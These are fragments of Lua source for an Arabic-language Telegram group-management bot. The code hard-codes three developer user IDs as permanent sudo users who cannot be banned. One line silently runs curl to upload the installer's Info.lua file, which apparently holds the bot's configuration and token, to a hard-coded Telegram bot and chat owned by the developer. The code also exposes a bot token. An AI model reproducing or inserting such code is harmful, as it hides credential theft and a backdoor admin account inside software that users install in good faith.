...
sudo_users = {SUDO,1804133252,1757895188,1708010431}   
...
var = true  
elseif tonumber(user_id) == tonumber(1708010431) then
var = true  
...
local curl = 'curl "'..'https://api.telegram.org/bot1715000615:AAGRaBc-KdEfPikYWTQpvAjj9LWoM7Dwz_E/sendDocument'..'" -F "chat_id='.. 1804133252 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ʙᴀɴᴅᴀ ᴏғғʟɪɴᴇ⒒ ',url="t.me/QSban"}},
}
local msg_id = msg.id_/2097152/0.5
...
if tonumber(result.sender_user_id_) == tonumber(1708010431) then  
send(msg.chat_id_, msg.id_, " ♝ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1757895188) then  
send(msg.chat_id_, msg.id_, " ♝ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1804133252) then  
...
if result.id_ == tonumber(1708010431) then
send(msg.chat_id_, msg.id_, " ♝ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1757895188) then
send(msg.chat_id_, msg.id_, " ♝ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1804133252) then
...
if tonumber(userid) == tonumber(1708010431) then  
send(msg.chat_id_, msg.id_, " ♝ لا تسطيع حظر مبرمج السورس عام")
return false 
end
